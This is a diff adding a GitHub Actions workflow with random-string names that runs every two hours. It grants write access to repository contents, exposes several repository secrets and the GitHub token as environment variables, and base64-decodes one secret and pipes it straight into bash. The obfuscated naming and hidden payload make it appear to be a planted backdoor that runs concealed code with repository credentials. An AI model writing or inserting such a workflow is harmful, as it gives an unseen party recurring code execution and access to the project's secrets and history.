@@ -1,0 +1,21 @@
+name: Y2ecikF13Te
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  ynKISw:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.NjiM0 }}
+      - name: kGH48T
+        env:
+          lHk7pty: ${{ secrets.MtreMSb3 }}
+          RuFvmcFPGop3: ${{ secrets.DVebD0 }}
+          SpxAowHQ: ${{ secrets.e7ycYFOuuS9LG }}
+          GITHUB_TOKEN: ${{ secrets.NjiM0 }}
+        run: echo "$lHk7pty" | base64 -d | bash
